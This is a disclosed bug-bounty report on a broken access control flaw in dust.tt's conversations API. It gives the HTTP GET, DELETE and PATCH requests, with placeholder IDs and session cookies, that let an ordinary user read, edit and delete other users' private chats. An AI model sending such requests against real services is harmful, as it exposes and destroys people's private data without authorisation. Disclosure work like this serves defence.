# Privilege Escalation leads to Unauthorized Access to Private Conversations By any Regular user  [Read , Edit and Delete]

## Report Details
- **Report ID**: 3103849
- **URL**: https://hackerone.com/reports/3103849
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2025-04-22T09:02:42.376Z
- **Disclosed**: 2025-04-29T11:01:20.804Z

## Reporter
- **Username**: 0xsom3a
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: dust

## Vulnerability Information
# Summary:
A normal authenticated user on dust.tt can escalate their privileges by accessing, modifying, and deleting any chat threads belonging to other users — including administrators — through a vulnerable API endpoint without having the appropriate permissions.

#Vulnerability Details:

## Reading Other Users’ Conversations:

`GET /api/w/<Workspace-id>/assistant/conversations/<victim-conversation-id>`

###Example:

```http
GET /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
```
###Response:

```json
{
  "conversation": {
    "id": [conversation_numeric_id], 
    "created": [timestamp_in_milliseconds], 
    "sId": "[conversation_string_id]", 
    "owner": {
      "id": [user_numeric_id], 
      "sId": "[user_string_id]", 
      "name": "[username]", 
      "role": "[user_role]", 
      "segmentation": null,
      "ssoEnforced": false, 
      "whiteListedProviders": null, 
      "defaultEmbeddingProvider": null, 
      "metadata": {
        "isBusiness": false
      }
    },
    "title": "[conversation_title]", 
    "visibility": "[visibility_status]", 
    "requestedGroupIds": []
  }
}
```

---

## Deleting Other Users’ Conversations:

- By sending a DELETE request to the same endpoint, the attacker can delete any conversation:

```http
DELETE /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
```
- No additional verification is performed server-side to confirm ownership of the conversation.

- The request succeeds and the conversation is permanently deleted from the target workspace.

---

## Editing Other Users’ Conversations:

Similarly, an attacker can update the content or metadata of a conversation by sending a PATCH request:


###Example:

```http
PATCH /api/w/[Workspace ID]/assistant/conversations/[Conversation ID]
Content-Type: application/json
Cookie: <User-session_token_or_cookies>

{
  "title": "Updated by Attacker",
   "visibility":"unlisted"
}
```
###Response:

```json
{
  "conversation": {
    "id": [conversation_numeric_id],
    "created": [timestamp_in_milliseconds],
    "sId": "[conversation_string_id]",
    "owner": {
      "id": [owner_numeric_id],
      "sId": "[owner_string_id]",
      "name": "[owner_username]",
      "role": "[owner_role]",
      "segmentation": null,
      "ssoEnforced": false,
      "whiteListedProviders": null,
      "defaultEmbeddingProvider": null,
      "metadata": {
        "isBusiness": false
      }
    },
    "title": "[conversation_title]",
    "visibility": "[visibility_status]",
    "content": [
      [
        {
          "id": [message_id],
          "sId": "[message_string_id]",
          "type": "[message_type]",
          "visibility": "[message_visibility]",
          "version": 0,
          "created": [message_timestamp],
          "user": {
            "sId": "[user_string_id]",
            "id": [user_numeric_id],
            "createdAt": [user_created_timestamp],
            "provider": "[auth_provider]",
            "username": "[user_username]",
            "email": "[user_email_address]",
            "firstName": "[user_first_name]",
            "lastName": "[user_last_name]",
            "fullName": "[user_full_name]",
            "image": "[user_profile_image_url]"
          },
          "mentions": [],
          "content": "[message_content]",
          "context": {
            "username": "[user_username]",
            "timezone": "[user_timezone]",
            "fullName": "[user_full_name]",
            "email": "[user_email_address]",
            "profilePictureUrl": "[user_profile_image_url]",
            "origin": "[message_origin]"
          }
        }
      ]
    ],
    "requestedGroupIds": []
  }
}
```
---

#POC VIDEO:

█████████

---

## Impact

This vulnerability allows a normal user to:

- **Read private conversations** of any user, including admins.
- **Modify other users' chat threads**.
- **Delete chat threads** of other users without their consent.

This issue **severely compromises** the **confidentiality**, **integrity**, and **availability** of user data within the application, making it a critical security concern that needs to be addressed immediately.

## Attachments
No attachments
